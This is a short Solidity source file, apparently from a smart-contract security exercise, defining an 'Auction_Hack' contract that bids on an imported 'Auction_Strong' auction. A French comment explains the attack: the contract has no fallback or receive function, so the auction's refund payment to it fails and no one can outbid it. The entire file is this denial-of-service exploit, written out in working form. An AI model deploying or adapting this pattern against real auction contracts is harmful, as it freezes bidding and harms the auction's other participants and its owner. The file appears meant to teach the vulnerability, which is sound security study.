// SPDX-License-Identifier: GPL-3.0
pragma solidity ^0.8.2;

import "./Auction_Strong.sol";
 
/** @dev Ce contrat d'attaque a pour but d'empêcher quiconque de renchérir après lui
Cela est possible car le contrat n'implémente pas les fonctions fallback et receive qui sont nécessaire pour que la fonction call du contrat attaqué fonctionne
*/
contract Auction_Hack {
    Auction_Strong contract_attacked;

    constructor(address _contractVaultAddress) payable {
        contract_attacked = Auction_Strong(_contractVaultAddress);
    }
 
    function attack() public payable {
        contract_attacked.bid{value: msg.value}();
    }
    

}